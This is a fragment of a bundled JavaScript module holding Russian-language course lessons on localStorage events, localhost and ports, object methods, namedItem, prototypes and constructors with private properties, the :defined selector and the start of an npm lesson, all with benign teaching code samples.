~localStorage~^^\n\n_____________________\n\n### ![ico-20 icon]  Events\n\nПри изменении содержимого ~localStorage~ в браузере генерируется событие  **_~storage~_**\n\nЭто событие может быть перехвачено объектом ~window~, если \"повесить\" прослушивателя события **_~storage~_**:\n\n~~~js\nwindow.addEventListener('storage', function () {  \n  console.log('localStorage was changed from outside')\n})\n~~~\n\nПовесьте обработчика и измените содержимое ~localStorage~ в консоли\n\n___________________________________\n\n[![ico-30 hw] **Тесты**](https://garevna.github.io/js-quiz/#localStorage)\n"},69057:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 icon] localhost\n\n## ![ico-25 icon] IP\n\nВсе, что подключено к Internet, имеет **_IP_**-адрес, который однозначно идентифицирует интернет-устройство\n\nСуществует два варианта **_IP_**-адресов: _публичные_ и _частные_\n\nПубличные адреса доступны для всех в Интернете\n\nЧастные адреса доступны только для _локальной сети_\n\nНапример, ~192.168.1.100~ является частным IP-адресом\n\nОн никогда не будет публичным IP-адресом,\nи существуют миллионы таких же IP-адресов ~192.168.1.100~ в мире\n\n## ![ico-25 icon] Router\n\nУстройство, называемое **маршрутизатор**, отвечает за обмен пакетами данных между локальной сетью и общедоступным Интернетом\n\nУ маршрутизатора есть функция, которая для каждого интернет-сообщения ( пакета ) создает локальный IP-адрес, однозначно соответствующий публичному IP-адресу, и наоборот ( для возврата пакетов )\n\n## ![ico-25 icon] Domain Name System\n\nБольшинство публичных IP-адресов имеют имена, называемые именами хостов DNS,\nи многие локальные IP-адреса тоже\n\nНапример, ~www.google.com~ - это имя хоста DNS, у которого есть IP-адрес\n\nЕсли в итерпретаторе командной строки набрать [эхо-команду](https://ab57.ru/cmdlist/ping.html)\n\n••ping www.google.com••\n\nможно убедиться, что компьютер перевел это имя хоста в IP-адрес, например ~173.194.73.106~, и отправляет ему пакеты\n\n![](https://github.com/garevna/js-course/blob/master/images/lessons/ping.png?raw=true)\n\n____________________________________________________\n\n\nЛюбое устройство, подключенное к Internet, имеет универсальное имя хоста **_localhost_**, \nа универсальный IP-адрес для **_localhost_** - это частный IP-адрес **~127.0.0.1~**\n\nЭтот адрес не распознается маршрутизатором\nТолько устройство (компьютер) «видит» его\n\n____________________________________________________\n\n\nОпциональный префикс **_www_** имени хоста веб-сайта предполагает, что интернет-устройство или хост отвечает за обслуживание приложения в **World Wide Web**\n\nСуществует множество типов приложений, которые работают в Internet, а не только в World Wide Web, включая, например, электронную почту и FTP (протокол передачи файлов)\n\n## ![ico-25 icon] Порт\n\nПакеты данных, поступающие девайсу из интернет, почти всегда имеют выделенный для них **порт**\n\nЭто число в диапазоне от 0 до 64k ( 65536 )\n^^за исключением некоторых зарезервированных номеров и диапазонов^^\n\nПриложение World Wide Web использует порт **80**\n\nЭлектронная почта, которая отправляется по протоколу SMTP, использует порт 25 (можно 465 и 587)\n\n**Порты** - это только идентификаторы на пакетах, указывающие, для какого приложения предназначены пакеты данных\n\nСетевое программное обеспечение будет прослушивать данный порт\n\nКогда девелоперы развертывают веб-приложение, они обычно привязывают его к альтернативному порту, а не к порту 80\n\nЧасто для этой цели используется порт **8080** \n^^Номер мог быть почти любым портом, например, 2018 или 12345^^\n^^Но 8080 удобно, потому что он отличается от порта 80, и все же он очень похож на 80^^\n\n![ico-20 warn] Только одно приложение может прослушивать конкретный порт на данном устройстве\n^^( номер порта должен быть уникальным )^^\n\nИтак, \n\n**_~localhost:8080~_** \n\nозначает \n\n••этот компьютер (127.0.0.1), приложение на порту 8080••\n\nили (если он связан с сетью)\n\n••http://localhost:8080/••\n\nПостроение этого URL-адреса:\n\n~~~console\n{scheme}://{hostname}:{port}{path}\n~~~\n\n• ~{scheme}~ - **http** \n• ~{hostname}~ - **localhost**\n• ~{port}~ - **8080**\n• ~{path}~ - **/**\n\nПротокол **HTTP** ( HyperText Transfer Protocol ), который использует Всемирная паутина, требует, чтобы имя хоста было включено в запрос в качестве заголовка или передано непосредственно в приложение\n\n^^Итак, **_http://127.0.0.1:8080/_**, где **localhost** заменен IP-адресом **127.0.0.1**, доберется до целевого приложения, но может работать некорректно, если сетевое приложение ожидает запрос на **localhost**^^\n\n____________________________________________________\n\n\n_Internet_ - это сетевая инфраструктура, соединяющая между собой миллионы компьютеров в сети _Internet_ \nлюбые два компьютера, подключенные к Internet, могут связываться друг с другом\n\n_World Wide Web_ - это способ получения информации посредством _Internet_\nДля передачи данных World Wide Web использует протокол **HTTP**\n\n____________________________________________________\n\n"},61774:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Методы\n\n**Метод** - это свойство-функция\n\nВ следующем примере объект  **obj**  имеет два свойства:  **name**  и  **showMessage**\n\n~~~js\nvar obj = {\n  name: \'Иван\',\n  showMessage: function (message) {\n    console.log(message ? message : \'Привет!\')\n  }\n}\n~~~\n\n~~~js\ntypeof obj.name         // "string"\ntypeof obj.showMessage  // "function"\n~~~\n\nОбращение к любому свойству: ~имя объекта~ + ~.~ + ~имя свойства~\n\nС методами отличие только в том, что для вызова метода после его имени нужны круглые скобки, и если у метода есть формальные параметры - то в круглых скобках нужно перечислить аргументы ( входные данные )\n\n~~~js\nobj.showMessage(\'Я иду в магазин\')\n~~~\n\n^^В результате такого вызова в консоль будет выведено  "Я иду в магазин"^^\n\nТаким образом, вызов метода отличается от вызова обычной функции только тем, что перед именем метода должно быть имя "хозяина", отделенное точкой от имени метода\n\nУ всех функций ( и всех переменных ) в _JS_ есть "хозяин"\n\nпоэтому все функции в _JS_ - методы\n\nа все переменные - свойства\n\nу обычных функций ( и переменных ) хозяин - глобальный объект ( ~window~ )\n\nвсе, что не находится в "частной собственности", принадлежит ему\n\nЕсли при обращении к свойству или вызове метода "хозяин" не указан, значит этот хозяин - глобальный объект\n\n~~~js\nvar year = 2019\nwindow.year       //  вернет 2019\n~~~\n\n_________________________________________________________\n\n### ![ico-20 file] Метод charCodeAt()\n\nМетод ~charCodeAt()~ работает только со строками\n\nТ.е. любая строка является "хозяином" метода ~charCodeAt()~\n\nЭтот метод возвращает числовой код символа в заданной позиции в строке\n\nНомер позиции символа в строке передается методу в качестве параметра\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nvar userName = \'Василий Алибабаевич\',\nuserName.charCodeAt(4)                 // 1083\n~~~\n\n^^**1083** - это десятичный код символа *"л"* - четвертого символа от начала строки ^^\n^^(нумерация символов начинается с нуля)^^\n\n_________________________________________________________________________\n\n[![ico-20 link] w3schools](https://www.w3schools.com/jsref/jsref_charCodeAt.asp)\n[![ico-20 link] Коды символов](https://www.ascii.cl/htmlcodes.htm)\n\n___________________________________________________________________________\n\n### ![ico-20 file] Метод push()\n\nМетод  ~push ()~  работает только с массивами\n\nТ.е. любой массив является "хозяином" метода ~push()~\n\nЭтот метод добавляет новый элемент в конец массива\n\nНовый элемент передается методу в качестве параметра\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nvar users = [\'John\', \'Helen\', \'Mary\']\nusers.push(\'Henry\')\n~~~\n\nв конец массива **users** будет добавлен элемент  *"Henry"*\n\nВ результате массив **users** будет:  ~["Jon", "Helen", "Mary", "Henry"]~\n\n![ico-20 warn] Метод ~push ()~ возвращает новую длину массива\n\nТ.е. после выполнения операции:\n\n~~~js\nz = users.push(\'Henry\')\n~~~\n\nзначение переменной ** z ** будет равно 4\n\n______________________________\n\n[![ico-30 hw] **Упражнения**](https://docs.google.com/forms/d/e/1FAIpQLSfhSiifjcwm7tLhcQftjAXByl-O93y3o31i91wAMr-uvi-MzQ/viewform)\n\n_________________________________________________________________\n\n[![ico-20 link] ^^w3schools^^](https://www.w3schools.com/jsref/jsref_push.asp)\n'},49937:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="## ![ico-25 icon] namedItem\n\nС помощью метода **~namedItem~** можно получить ссылку на именованный элемент DOM\n\n^^^[HTML Collections]\n^^Ряд свойств объекта document предоставляют доступ к различным HTML-коллекциям:^^\n__________________________\n\n^^![ico-20 green-ok] document.forms^^\n^^![ico-20 green-ok] document.images^^\n^^![ico-20 green-ok] document.anchors^^\n^^![ico-20 green-ok] document.all^^\n^^![ico-20 green-ok] document.scripts^^\n^^![ico-20 green-ok] document.links^^\n^^![ico-20 green-ok] document.plugins^^\n\n^^^\n\n### ![ico-25 cap] Пример 1\n\n~~~html\n<html>\n  <head>\n    <link\n      name=\"Google\"\n      id=\"fonts\"\n      href=\"https://fonts.googleapis.com/css?family=Roboto|&amp;display=swap\"\n      rel=\"stylesheet\"\n    />\n  </head>\n  <body>\n    <form name=\"form\">\n      <a name=\"ref\">Home</a>\n      <img name=\"picture\">\n    </form>\n    <div id=\"div\"></div>\n    <script name=\"script\"><\/script>\n  </body>\n</html>\n~~~\n\nПопробуем получить элемент ~link~ по значению его атрибута **~name~**:\n\n~~~js\ndocument.all.namedItem('Google')  // null\n~~~\n\nа теперь по значению атрибута **~id~**:\n\n~~~js\ndocument.all.namedItem('fonts')\n~~~\n\n**Результат**\n\n~~~console\n<link name=\"Google\" id=\"fonts\" href=\"https://fonts.googleapis.com/css?family=Roboto|&amp;display=swap\" rel=\"stylesheet\">\n~~~\n\nКак видим, для элементов ~link~ метод **_~namedItem~_** возвращает элемент по его **~id~**, но не по его **~name~**\n\n_________________________________________\n\n### ![ico-25 cap] Пример 2\n\nПосмотрим на поведение метода **_~namedItem~_** с другими элементами:\n\n~~~js\nconsole.log(document.forms.namedItem('form'))\nconsole.log(document.anchors.namedItem('ref'))\nconsole.log(document.images.namedItem('picture'))\nconsole.log(document.scripts.namedItem('script'))\nconsole.log(document.all.namedItem('div'))\n~~~\n\nВсе элементы были найдены по значению их атрибута **~name~**\n\n________________________________________________\n\n### ![ico-25 cap] Пример 3\n\nДля получения инфо о том, как работает метод **_~namedItem~_** с различными элементами DOM, воспользуемся функцией:\n\n~~~js\nfunction testNamedItem (tagName) {\n  var elem = document.body\n    .appendChild(document.createElement(tagName))\n  elem.id = 'testId'\n  elem.name = 'testName'\n  console.log('by id: ', document.all.namedItem('testId') ? '+' : '&ndash;')\n  console.log('by name: ', document.all.namedItem('testName') ? '+' : '&ndash;')\n  document.body.removeChild(elem)\n}\n~~~\n\n^^Эта функция получает в качестве аргумента валидное имя тега html, создает и вставляет на страницу этот элемент, устанавливает ему атрибуты **~name~** и **~id~**, а затем проверяет работу метода **_~namedItem~_** с этими атрибутами^^\n\nС помощью этой функции легко установить, что метод **_~namedItem~_** работает по-разному для различных элементов:\n\n| **^^Element^^** | **^^id^^** | **^^name^^** |\n| ^^form^^ | + | + |\n| ^^ a^^ | + | + |\n| ^^img^^ | + | + |\n| ^^input^^ | + | + |\n| ^^select^^ | + | + |\n| ^^textarea^^ | + | + |\n| ^^script^^ | + | &ndash; |\n| ^^link^^ | + | &ndash; |\n| ^^div^^ | + | &ndash; |\n| ^^ul^^ | + | &ndash; |\n| ^^li^^ | + | &ndash; |\n\n^^Самостоятельно проверьте остальные элементы^^\n\n_____________________________________________________\n\n^^^[HTMLCollections]\n\nЕсли проверить работу метода на различных HTMLCollections, то можно обнаружить, что этот метод не работает с коллекцией элементов link:\n\n| Element | id | name |\n| documenmt.forms | + | + |\n| document.anchors | + | + |\n| document.images | + | + |\n| document.scripts | + | + |\n| document.links | &ndash; | &ndash; |\n\n^^^\n"},67493:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Объекты JS\n\n_____________________________________________\n\n## ![ico-25 icon] Нативные и хост-объекты JS\n\nНативные объекты определяются спецификацией языка\n\nНативные объекты представлены **встроенными объектами**\n\n^^^[Встроенные объекты]\n\n**Объекты**\n     ^^Math^^\n     ^^JSON^^\n**Конструкторы**\n     ^^Array^^\n     ^^Boolean^^\n     ^^Number^^\n     ^^String^^\n     ^^Function^^\n     ^^Object^^\n     ^^Date^^\n     ^^Error^^\n     ^^Map^^\n     ^^Set^^\n     ^^FormData^^\n     ^^Promise^^\n     ^^Proxy^^\n     ^^RegExp^^\n     ...\n^^^\n\nи объектами, которые создаются в процессе работы кода\n\n~~~js\nvar obj = {\n  name: 'Google',\n  show: false\n}\n~~~\n\n**host-объекты** - это объекты среды, в которой функционирует код\n\nК   host-объектам относятся объекты **BOM** и **DOM**\n\n^^^[host-объекты]\n**Объекты**\n     ^^window^^\n     ^^document^^\n     ^^history^^\n     ^^location^^\n     ^^console^^\n     ...\n**Конструкторы**\n     ^^Event^^\n     ^^HTMLElement^^\n     ^^XMLHttpRequest^^\n     ...\n^^^\n\n![ico-20 warn] ^^Поскольку конструкторы - это функции, для получения дерева их свойств нужно использовать метод **~console.dir~** ( а не ~console.log~ )^^\n\n~~~js\nconsole.dir(Promise)\nconsole.dir(XMLHttpRequest)\n~~~\n\nСоздать нативный объект JS можно двумя способами:\n\n![ico-20 green-ok] С помощью литерала объекта\n![ico-20 green-ok] С помощью конструктора\n\n_________________________________\n\n## ![ico-25 icon] Литерал объекта\n\nВ литеральной нотации объект описывается внутри блока фигурных скобок:\n\n![ico-25 cap]\n\n~~~js\nvar figure = {\n  type: 'circle',\n  radius: 100,\n  color: 'red'\n}\n~~~\n\nВсе эти свойства доступны извне:\n\n~~~js\nconsole.log(figure.type)\nconsole.log(figure.radius)\nconsole.log(figure.color)\n~~~\n\nили так:\n\n~~~js\nconsole.log(figure['type'])\nconsole.log(figure['radius'])\nconsole.log(figure['color'])\n~~~\n\n![ico-20 pin] Свойства объектов, заданных литералом, являются **публичными**, поскольку они доступны извне\n\n![ico-25 cap] Хотя всегда есть способ это обойти ![ico-25 smile]\n\n^^^[Closure]\n\n~~~js\nvar sample = {\n  path: 'https://garevna.github.io/js-lessons/icons/',\n\n  testToken: (function (token) {\n    return function () {\n      return prompt('Input Your Token: ') === token\n    }\n  })(prompt('Set Your Token: ')),\n\n  page: function () {\n    const ico = this.testToken() ? 'green-ok.png' : 'no_entry.png'\n    document.write(`<img src=\"${this.path}${ico}\">`)\n  }\n}\n\nsample.page()\n~~~\n\n^^В этом примере при создании объекта запрашивается ввод токена доступа, который будет сохранен в замыкании метода **testToken**^^\n\n^^при попытке получения доступа к странице (свойству **page**) будет вызван метод **testToken**, который запросит токен доступа и сверит его со значением, хранящимся в замыкании^^\n\n^^Если значения совпадут, то на страницу будет выведено ![ico-25 green-ok]^^\n\n^^В противном случае на страницу будет выведено ![ico-25 err]^^\n\n^^^\n\n____________________________________________\n\n\n### ![ico-20 icon] Собственные свойства\n\nСобственные свойства _инкапсулированы_ в экземпляре\n\nНапример, экземпляр **~figure~** выступает в роли \"капсюлы\", в которой свойства **~type~**,  **~size~**  и  **~color~**  отделены от таких же свойств других экземпляров\n\nМожно создать объект  **~figure2~**  с таким же набором свойств, но с другими значениями этих свойств:\n\n◘◘![ico-25 cap] 1◘◘\n\n~~~js\nvar figure2 = {\n  type: 'triangle',\n  size: 150,\n  color: 'blue'\n}\n~~~\n\nУ экземпляров **~figure~** и **~figure2~** одинаковый набор свойств ( имена свойств совпадают )\n\nОднако значения этих свойств в каждом экземпляре отличаются\n\nИтак, **_собственные свойства экземпляра - это свойства, инкапсюлированные в этом экземпляре_**\n\n^^свойства  **_~type~_**,  **_~size~_**  и  **_~color~_**  являются **собственными** свойствами экземпляров  **~figure~**  и  **~figure2~** потому, что их значения локализованы внутри \"капсюлы\" под именем экземпляра )^^\n\n~~~js\nfigure.type       // \"circle\"\nfigure2.type      // \"triangle\"\n~~~\n\n__________________________________________\n\n### ![ico-20 icon] Перечислимые свойства\n\n**Перечислимые** свойства экземпляра - это свойства, которые итерируются оператором цикла  **~for...in~**\n\n![ico-20 warn] По умолчанию свойства нативных объектов, создаваемых в процессе выполнения кода, являются перечислимыми\n![ico-20 warn] Свойства встроенных нативных объектов являются неперечислимыми\n\n~~~js\nfor (var prop in figure) console.log(prop)\n~~~\n\nВ консоль будут выведены\n\n~~~console\ntype\nsize\ncolor\n~~~\n\n![ico-20 pin] Итак, с помощью литерала объекта можно создать **публичные собственные перечислимые** свойства экземпляра\n\nОчевидно, у каждого из этих терминов есть антоним, т.е. должны существовать _приватные_, _несобственные_ и _неперечислимые_ свойства\n\n![ico-20 pin] **Приватные свойства** можно создать с помощью **конструктора**\n![ico-20 pin] _Несобственные свойства_ - это **унаследованные** свойства\n^^Что касается создания **_неперечислимых_** свойств - мы еще вернемся к этой теме далее^^\n\n________________________\n\n### ![ico-20 icon] Унаследованные свойства\n\n◘◘![ico-25 cap] 2◘◘\n\n~~~js\nvar figure = {\n  type: 'circle',\n  radius: 100,\n  color: 'red'\n}\n~~~\n\nЕсли \"развернуть\" экземпляр **figure** в консоли, то помимо собственных перечислимых свойств ~color~, ~size~ и ~type~ мы увидим свойство **~&#95;&#95;proto&#95;&#95;~**, которое не было выведено в консоль, когда мы итерировали объект оператором ~for...in~\n\n~~~console\n▼{ type: \"Окружность\", radius: 100, color: \"red\" }\n    color:\"red\"\n    radius:100\n    type:\"Окружность\"\n  ► __proto__:Object\n~~~\n\nВывод - это свойство **неперечислимое**\n\nРазберемся, является ли это свойство собственным\n\nЗначением этого свойства является ссылка на встроенный нативный объект (конструктор) **~Object~**\n\nЕсли развернуть свойство **~&#95;&#95;proto&#95;&#95;~**, то в консоли мы увидим следующую картину:\n\n^^^[__proto__]\n\n~~~console\n▼ __proto__\n   ► constructor: ƒ Object()\n   ► hasOwnProperty: ƒ hasOwnProperty()\n   ► isPrototypeOf: ƒ isPrototypeOf()\n   ► propertyIsEnumerable: ƒ propertyIsEnumerable()\n   ► toLocaleString: ƒ toLocaleString()\n   ► toString: ƒ toString()\n   ► valueOf: ƒ valueOf()\n   ► __defineGetter__ ƒ __defineGetter__)\n   ► __defineSetter__ ƒ __defineSetter__)\n   ► __lookupGetter__ ƒ __lookupGetter__)\n   ► __lookupSetter__: ƒ __lookupSetter__()\n   ► get __proto__: ƒ __proto__()\n   ► set __proto__: ƒ __proto__()\n~~~\n\n^^^\n\nПервое, что обращает внимание - наш экземпляр создан конструктором **~Object~**:\n\n~constructor: ƒ Object()~\n\nДавайте развернем **~Object~** в консоли\n\n^^для этого используем метод ~console.dir~, поскольку **~Object()~** - это конструктор, т.е. функция, и метод ~console.log()~ вернет нам ••_ ƒ_ Object() { [native code] }••^^\n\nОбратите внимание на свойство **_~prototype~_** конструктора **~Object~**\n\nЭто объект\n\nРазвернем этот объект, и посмотрим на его содержимое:\n\n~~~console\n▼ prototype:\n   ► constructor: ƒ Object()\n   ► hasOwnProperty: ƒ hasOwnProperty()\n   ► isPrototypeOf: ƒ isPrototypeOf()\n   ► propertyIsEnumerable: ƒ propertyIsEnumerable()\n   ► toLocaleString: ƒ toLocaleString()\n   ► toString: ƒ toString()\n   ► valueOf: ƒ valueOf()\n   ► __defineGetter__: ƒ __defineGetter__()\n   ► __defineSetter__: ƒ __defineSetter__()\n   ► __lookupGetter__: ƒ __lookupGetter__()\n   ► __lookupSetter__: ƒ __lookupSetter__()\n   ► get __proto__: ƒ __proto__()\n   ► set __proto__: ƒ __proto__()\n~~~\n\n![ico-20 warn] оно полностью совпадает с тем, что мы обнаружили ранее в свойстве **~&#95;&#95;proto&#95;&#95;~** экземпляра **figure**\n\nПойдем далее, и заглянем в экземпляр **figure2**\n\nТам мы тоже обнаружим свойство **~&#95;&#95;proto&#95;&#95;~**\n\nи его содержимое будет точно таким же, как у экземпляра **figure**\n\nСоздадим пустой объект\n\n~~~js\nvar obj = {}\n~~~\n\nи развернем его в консоли\n\nБа! знакомые все лица! ![ico-25 smile]\n\nМы видим все то же свойство **~&#95;&#95;proto&#95;&#95;~**\n\nУ всех нативных объектов JS по умолчанию есть это свойство\n\n![ico-20 warn] Свойство **~&#95;&#95;proto&#95;&#95;~** создаваемых _литералом_ объектов JS - это ссылка на свойство **_~prototype~_** конструктора **~Object~**\n\nА что там со _встроенными_ нативными объектами?\n\nРазверните в консоли объект **Array**\n\n~~~js\nconsole.dir(Array)\n~~~\n\nи вы увидите цепочку протипов\n\nПоследним \"звеном\" в цепочке прототипов всегда будет **~Object~**\n\n~~~js\nconsole.dir(Array.__proto__.__proto__)  // Object\n~~~\n\n\"Жирная точка\" в конце цепочки прототипов - **~null~**\n\nАналогичная картина будет с любым встроенным конструктором\n\n![ico-20 pin] У встроенных объектов, которые не являются конструкторами ( типа _Math_ ) цепочка протипов будет короче: свойство **~&#95;&#95;proto&#95;&#95;~** будет ссылкой на **~Object~**\n\n____________________________\n\n![ico-25 hw] **Упражнение**\n\nвыведите в консоль все нативные встроенные объекты и отследите в цепочке прототипов ссылку на **~Object~**\n\n_________________________\n\n## ![ico-25 icon] Конструктор\n\nНастало время разобраться с тем, что же такое конструктор\n\n![ico-25 warn] Это функция (_отсюда следует, что там можно что-то спрятать_)\n![ico-25 warn] Чтобы она работала как **конструктор**, при вызове  перед ее именем нужно указать ключевое слово **~new~**, и в этом случае:\n![ico-20 green-ok] ей не нужен оператор ~return~, но при этом она вернет **экземпляр** объекта\n![ico-20 green-ok] внутри нее **~this~** будет указывать не на _глобальный объект_, а на возвращаемый **экземпляр**\n![ico-20 green-ok] все объявленные внутри нее переменные и функции будут _инкапсюлированы_ в созданном **экземпляре** (_т.е. будут собственными свойствами и методами экземпляра_)\n![ico-20 green-ok] у нее будет свойство **~prototype~** (_которое бывает только у функций_)\n![ico-20 green-ok] то, что мы поместим в свойство **~prototype~**, _унаследуют_ все экземпляры\n\n![ico-25 warn] Имена конструкторов принято начинать с заглавной литеры\n\n___________________________________\n\n◘◘![ico-25 cap] 3◘◘\n\n~~~js\nfunction Sample (params) {}\n\nvar obj = new Sample()\n~~~\n\nВыведем в консоль экземпляр **obj**:\n\n~~~console\n▼ Sample {}\n    ▼ __proto__:\n        ► constructor: ƒ Sample( params )\n        ► __proto__: Object\n~~~\n\n• мы создали пустой объект класса **Sample** ^^(точнее, мы создали экземпляр объекта)^^\n• у него нет собственных свойств ^^(потому что в конструкторе ничего не объявлено)^^\n• у него есть _цепочка прототипов_ - это вложенные одно в другое свойства  **~&#95;&#95;proto&#95;&#95;~**\n• первое \"звено\" в цепочке прототипов - это ссылка на свойство **~prototype~** функции-конструктора **Sample**\n• свойство **~prototype~**  функции-конструктора **Sample**  является объектом\n• это значит, что у него тоже есть свойство **~&#95;&#95;proto&#95;&#95;~**\n• это вложенное свойство **~&#95;&#95;proto&#95;&#95;~** - следующее \"звено\" в цепочке прототипов\n• оно является ссылкой на **Object**\n\n~~~js\nSample.prototype\n~~~\n\n~~~console\n▼ {constructor: ƒ}\n    ► constructor: ƒ Sample(params)\n    ► __proto__: Object\n~~~\n\nМы можем добавить свойства в **~prototype~** конструктора **Sample**\n\n~~~js\nSample\n  .prototype\n  .setNewProperty = function (propName, propValue) {\n    this[propName] = propValue\n  }\n~~~\n\nЕсли теперь вывести в консоль экземпляр **obj**, то в его свойстве **~&#95;&#95;proto&#95;&#95;~** мы обнаружим новое перечислимое свойство **_~setNewProperty~_** (_унаследованный метод_)\n\nВызовем этот метод:\n\n~~~js\nobj.setNewProperty('name', 'Petro')\n~~~\n\nи обнаружим, что у экземпляра **obj** появилось новое _собственное перечислимое_ свойство **name**\n\n![ico-20 warn] При обращении к свойству сначала оно ищется среди собственных свойств экземпляра, и если не будет найдено, то поиск будет продолжен среди свойств прототипа, и так далее, пока не закончится цепочка прототипов\n\n![ico-25 pin] Конструктор позволяет создавать экземпляры объектов, имеющих не только публичные, но и приватные свойства и методы\n\n___________________________________________\n\n**Конструктор Function**\n\n◘◘![ico-20 cap] 4◘◘\n\n~~~js\nvar funcText = `\n  var x = 'Hello'\n  var y = 'baby'\n  console.log(x + ', ' + y)\n`\n\nvar func = new Function(funcText)\n\nconsole.log(func)\nfunc()\n~~~\n\n**Result:**\n\n~~~console\nƒ anonymous(\n) {\n   var x = 'Hello'\n   var y = 'baby'\n   console.log(x + ', ' + y)\n}\nHello, baby\n~~~\n\n___________________________________\n\n## ![ico-25 icon] Публичные и приватные свойства\n\nКонструктор - это функция, из чего следует, что с помощью конструктора можно \"спрятать\" переменные и функции\nгде спрятать? - в экземпляре, созданном с помощью этого конструктора\n\nКак мы уже знаем, конструктор создает **_собственные_** свойства и методы экземпляров путем объявления переменных и функций\n\n![ico-25 pin] Все свойства, объявленные в конструкторе с ключевым словом  **~this~**, будут **_публичными_**\n\n![ico-25 pin] Все свойства, объявленные в конструкторе с ключевым словом  **~var~** или **~function~**, будут **_приватными_**\n\nК публичным свойствам и методам экземпляра всегда есть доступ из внешнего окружения\n\nДостаточно использовать _имя экземпляра_ + \".\" + _имя свойства_ (_метода_)\n^^при вызове метода нужно еще добавить круглые скобки после его имени^^\n\nПриватные свойства (и методы) экземпляра недоступны извне\n\nОни не отображаются в консоли при выводе объекта\n\n◘◘![ico-25 cap] 5◘◘\n\n~~~js\nvar  Girl = function (name = 'Jane', age = 25) {\n  this.name = name\n  this.age = age\n\n  function showName (name) {\n    console.log(`My name is ${name}`)\n  }\n\n  this.changeName = function (newName) {\n    this.name = newName\n    showName(this.name)\n  }\n}\n\nvar lena = new Girl('Helen', 18)\nlena.changeName('Mary')\n~~~\n\nВ этом примере **_~defaultName~_**  и **_~showName~_** являются **_приватными_** свойствами экземпляра **~lena~**\n\n**_~name~_**, **_~age~_** и **_~changeName~_** являются **_публичными_** свойствами экземпляра **~lena~**\n\nВ публичных методах экземпляра (**_~changeName~_**)  **~this~**  будет ссылкой на экземпляр (**~lena~**)\n\n![ico-20 warn] в приватных методах (**_~showName~_**) экземпляра контекстом вызова будет *глобальный объект* **~window~**\n\n(т.е. внутри метода **_~showName~_** **~this~**  будет ссылкой на объект **~window~**)\n\n___________________________________\n\n◘◘![ico-25 cap] 6◘◘\n\n~~~js\nvar girls = []\n\ngirls[0] = new Girl('Helen', 18)\ngirls[1] = new Girl('Mary', 20)\n~~~\n\n◘◘![ico-25 cap] 7◘◘\n\n~~~js\nvar Bag = function (keyword) {\n  var money = 3000\n\n  var documents = [\n    'Passport',\n    'Driver license',\n    'University Diploma'\n  ]\n\n  var accessories = [\n    'Keys',\n    'Movie tickets',\n    'Medicine'\n  ]\n\n  this.content = null\n\n  function getMoney (sum) {\n    money -= sum\n  }\n\n  this.payment = function (sum) {\n    if (prompt('Who are you?') !== keyword) return '⛔️'\n    getMoney(sum)\n    console.info(`Money left in wallet: ${money} uah`)\n    return `Paid: ${sum} uah`\n  }\n\n  this.rummage = function () {\n    this.content = [\n      documents,\n      accessories,\n      money\n    ]\n    console.log(`Search protocol. Bag contents: ${this.content}`)\n  }\n}\n\nvar myCase = new Bag('it\\'s me, your mistress')\n~~~\n\n^^Конструктор **~Bag~**  создает объект с приватными свойствами  **~money~**,  **~documents~** и  **~accessories~**^^\n\n^^С его помощью создаем экземпляр **myCase**^^\n\n^^При создании экземпляра передаем ему ключевую фразу для доступа к содержимому сумочки '_это я, твоя хозяйка_'^^\n\n^^Поскольку свойства  **~money~**,  **~documents~** и  **~accessories~** приватные,  \"сумка закрыта\"^^\n\n^^Посторонним нет доступа к ее содержимому^^\n\n^^Публичное свойство **~content~** изначально имеет значение  **~null~**^^\n\n^^Это все, что вы можете увидеть в закрытой сумке^^\n\n^^Если хозяин сумки согласится показать ее содержимое, то оно будет помещено в публичное свойство **~content~** для обозрения^^\n\n^^Функция **~getMoney()~** доступа к деньгам  (приватному свойству **~money~**) также является приватной, поскольку никто, кроме хозяина, не должен иметь возможность взять деньги из сумки^^\n\n^^И есть два публичных метода:^^\n\n^^• **payment (_sum_, _key_)** - оплата^^\n^^• **rummage ()** - таможенный досмотр^^\n\n^^В случае совершения платежа с помощью публичного метода  **payment**^^\n\n~~~js\nconsole.log(myCase.payment(2000))\n~~~\n\n^^запрашивается ключевая фраза, сверяется с установленной при создании экземпляра, и если значения совпали, то вызывается приватный метод **~getMoney~**, который уменьшает приватное свойство **~money~** на сумму платежа,  после  чего публичный метод **~pay()~** с чистой совестью возвращает изъятую сумму^^\n\n^^Если будет введена неправильная ключевая фраза, то запрос будет отклонен с возвратом ![ico-20 err]^^\n\n^^В случае таможенного досмотра вызывается публичный метод **rummage()**^^\n\n~~~js\nmyCase.rummage ()\n~~~\n\n^^который \"выкладывает на обозрение\" содержимое сумочки (помещает его в публичное свойство **~content~**)^^\n\n^^Теперь работники таможни могут посмотреть содержимое:^^\n\n~~~js\nconsole.log(myCase.content)\n~~~\n\n_________________________________________\n\nТаким образом, приватные и публичные свойства и методы помещаются в \"капсулу\" - объект (экземпляр)\n\nЭто и есть инкапсуляция (**_encapsultion_**)\n\nИмена свойств и методов внутри \"капсулы\" принадлежат к пространству имен объекта\n\nМы агрегировали под одним именем (именем объекта) всю совокупность переменных и функций, определяющих и изменяющих его (объекта) состояние\n"},20233:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Селектор :not(:defined)\n\n![ico-25 cap] ** 1 **\n\n~~~html\n<body>\n  <hello-element></hello-element>\n  <bye-element></bye-element>\n</body>\n~~~\n\nЗапрос\n\n~~~js\ndocument.querySelectorAll(':not(:defined)')\n~~~\n\nРезультат\n\n~~~console\n▶ NodeList(2) [hello-element, bye-element]\n~~~\n\nЗапрос\n\n~~~js\ndocument.querySelectorAll(':defined')\n~~~\n\nРезультат\n\n~~~console\n▶ NodeList(3) [html, head, body]\n~~~\n"},10509:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-50 npm] npm\n\nМенеджер пакетов **npm** - это крупнейший в мире реестр программного обеспечения\n( около 3 миллиардов загрузок в неделю )\n\nВ реестре содержится более 600 000 пакетов\n\nOpen-source разработчики всего мира используют **npm**\nдля совместного использования и заимствования пакетов\n\n_______________________________________________________________________________________________\n\n## ![ico-25 icon] Installation\n\nПоскольку **npm** идет в составе **Node.js**, 